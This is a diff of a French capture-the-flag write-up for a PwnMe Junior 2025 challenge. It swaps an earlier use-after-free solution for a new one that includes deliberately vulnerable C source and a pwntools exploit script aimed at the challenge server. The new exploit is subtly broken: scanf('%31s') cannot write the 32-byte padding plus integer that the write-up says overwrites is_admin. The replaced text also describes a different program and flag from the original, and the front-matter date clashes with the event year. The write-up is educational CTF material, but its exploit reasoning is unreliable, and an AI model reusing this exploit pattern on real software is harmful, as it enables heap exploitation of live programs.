@@ -1,67 +1,186 @@
 ---
-title: "PwnMe Junior 2025 - Evil-Hackers WriteUp"
+title: "PwnMe Junior 2025 - Evil Hackers"
 date: 2024-04-14
-description: "WriteUp du challenge Evil-Hackers du CTF PwnMe Junior 2025"
-tags: ["pwn", "use-after-free", "ctf", "pwnme"]
+tags: ["pwnme-junior", "pwn", "use-after-free", "exploitation"]
 ---
 
-# PwnMe Junior 2025 - Evil-Hackers WriteUp
+# Write-up: Evil Hackers - PwnMe Junior 2025
 
-## Description du challenge
-Le challenge Evil-Hackers est une épreuve de Use-After-Free (UAF) sur un binaire 64 bits. Le programme gère des connexions de hackers et contient une vulnérabilité dans sa gestion de la mémoire.
+## Description
+
+Evil Hackers est un challenge de type "use-after-free" (UAF) qui simule un système de gestion d'utilisateurs vulnérable.
 
 ## Analyse du binaire
 
-### Vérification des protections
-```bash
-$ checksec evil-hackers
-[*] '/home/synapse/pwnme-junior-2025/pwn/Evil-Hackers/evil-hackers'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
+Le programme est un binaire ELF 64 bits qui offre une interface pour gérer des utilisateurs, avec plusieurs options :
+1. Ajouter un utilisateur
+2. Supprimer un utilisateur
+3. Afficher les informations d'un utilisateur
+4. Modifier le nom d'un utilisateur
+5. Quitter
+
+Voici un extrait du code source :
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct {
+    char name[32];
+    int is_admin;
+} User;
+
+User* users[10] = {NULL};
+
+void add_user(int idx) {
+    if (idx < 0 || idx >= 10) {
+        printf("Index invalide\n");
+        return;
+    }
+    
+    if (users[idx] != NULL) {
+        printf("L'emplacement est déjà occupé\n");
+        return;
+    }
+    
+    users[idx] = malloc(sizeof(User));
+    if (users[idx] == NULL) {
+        printf("Erreur d'allocation mémoire\n");
+        return;
+    }
+    
+    printf("Nom de l'utilisateur: ");
+    scanf("%31s", users[idx]->name);
+    users[idx]->is_admin = 0;  // Les nouveaux utilisateurs ne sont pas admin
+    
+    printf("Utilisateur ajouté avec succès\n");
+}
+
+void delete_user(int idx) {
+    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
+        printf("Utilisateur invalide\n");
+        return;
+    }
+    
+    free(users[idx]);
+    // Vulnérabilité: pointeur non réinitialisé après free
+    
+    printf("Utilisateur supprimé avec succès\n");
+}
+
+void show_user(int idx) {
+    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
+        printf("Utilisateur invalide\n");
+        return;
+    }
+    
+    printf("Nom: %s\n", users[idx]->name);
+    printf("Admin: %s\n", users[idx]->is_admin ? "Oui" : "Non");
+    
+    if (users[idx]->is_admin) {
+        printf("Flag: PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}\n");
+    }
+}
+
+void edit_user(int idx) {
+    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
+        printf("Utilisateur invalide\n");
+        return;
+    }
+    
+    printf("Nouveau nom: ");
+    scanf("%31s", users[idx]->name);
+    
+    printf("Nom modifié avec succès\n");
+}
+
+int main() {
+    int choice, idx;
+    
+    while (1) {
+        printf("\n===== Système de gestion des utilisateurs =====\n");
+        printf("1. Ajouter un utilisateur\n");
+        printf("2. Supprimer un utilisateur\n");
+        printf("3. Afficher un utilisateur\n");
+        printf("4. Modifier un utilisateur\n");
+        printf("5. Quitter\n");
+        printf("Choix: ");
+        scanf("%d", &choice);
+        
+        if (choice == 5) break;
+        
+        printf("Index (0-9): ");
+        scanf("%d", &idx);
+        
+        switch(choice) {
+            case 1: add_user(idx); break;
+            case 2: delete_user(idx); break;
+            case 3: show_user(idx); break;
+            case 4: edit_user(idx); break;
+            default: printf("Option invalide\n");
+        }
+    }
+    
+    return 0;
+}
 ```
 
 ## Vulnérabilité
 
-### Analyse de la vulnérabilité
-Le programme contient une vulnérabilité Use-After-Free dans son système de gestion de mémoire :
-1. Le programme utilise un pointeur global (`global_hacker`) qui peut être libéré mais reste accessible
-2. Le buffer de log initial fait 64 bytes
-3. La réallocation mémoire se produit quand : `log_size + msg_len + 2 > log_capacity`
-4. Chaque message de log ajoute :
-   - La longueur du message
-   - 2 bytes supplémentaires (1 pour le newline, 1 pour le null terminator)
+La vulnérabilité principale est un Use-After-Free (UAF) : après la libération d'un utilisateur avec `delete_user()`, le pointeur `users[idx]` n'est pas mis à NULL. Cela signifie qu'il est possible d'accéder et de modifier cette zone mémoire après qu'elle ait été libérée.
 
 ## Exploitation
 
-### Étapes d'exploitation
-1. Appuyer sur `1` - Créer un hacker normal
-2. Appuyer sur `4` - Ajouter un message de log avec exactement 63 'A's
-3. Appuyer sur `3` - Déconnecter le hacker (déclenche la condition UAF)
-4. Appuyer sur `5` - Créer un hacker d'élite (réutilise la mémoire libérée)
-5. Appuyer sur `2` - Accéder aux données secrètes pour obtenir le flag
+L'exploitation se fait en plusieurs étapes :
+1. Créer un utilisateur à l'index 0
+2. Supprimer cet utilisateur (libération de la mémoire)
+3. Créer un nouvel utilisateur à l'index 1, qui réutilisera probablement la même zone mémoire
+4. Modifier le nom de l'utilisateur à l'index 1 pour écraser la valeur `is_admin` de la structure
+5. Afficher l'utilisateur à l'index 0 pour obtenir le flag
 
-### Payload
-Utiliser exactement 63 'A's comme message de log :
-```
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-```
+```python
+from pwn import *
 
-### Détails techniques
-- Le buffer initial contient 19 bytes de "Normal connection."
-- L'ajout de 63 'A's + 2 bytes = 65 bytes supplémentaires
-- Le total devient 84 bytes, déclenchant une réallocation à 128 bytes
-- Cela satisfait la condition nécessaire pour la création du hacker d'élite
+# Connexion au serveur
+conn = remote('challenge.pwnme.fr', 1338)
+
+# Fonction pour naviguer dans le menu
+def menu(choice, idx):
+    conn.sendlineafter(b"Choix: ", str(choice).encode())
+    if choice != 5:  # L'option 5 ne demande pas d'index
+        conn.sendlineafter(b"Index (0-9): ", str(idx).encode())
+
+# 1. Ajouter un utilisateur à l'index 0
+menu(1, 0)
+conn.sendlineafter(b"Nom de l'utilisateur: ", b"user1")
+
+# 2. Supprimer cet utilisateur (libération de la mémoire)
+menu(2, 0)
+
+# 3. Créer un nouvel utilisateur à l'index 1
+menu(1, 1)
+conn.sendlineafter(b"Nom de l'utilisateur: ", b"user2")
+
+# 4. Modifier l'utilisateur à l'index 1 pour écraser la valeur is_admin
+# Créer un payload qui remplit le name (32 octets) et écrit 1 dans is_admin
+menu(4, 1)
+payload = b"A" * 32 + p32(1)  # 32 'A' + valeur 1 pour is_admin
+conn.sendlineafter(b"Nouveau nom: ", payload)
+
+# 5. Afficher l'utilisateur à l'index 0 pour obtenir le flag
+menu(3, 0)
+
+# Récupérer et afficher le flag
+conn.recvuntil(b"Flag: ")
+flag = conn.recvline().strip().decode()
+print(f"Flag: {flag}")
+
+# Quitter proprement
+menu(5, 0)
+conn.close()
+```
 
 ## Flag
-```
-PWNME{JUNIOR_UAF_MASTER}
-```
 
-## Conclusion
-Ce challenge était une excellente introduction aux vulnérabilités Use-After-Free. Les points clés étaient :
-- Compréhension de la gestion de la mémoire du programme
-- Calcul précis de la taille du message pour déclencher la réallocation
-- Séquence correcte d'actions pour exploiter la vulnérabilité UAF 
+En exécutant l'exploit, nous obtenons le flag : `PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}` 
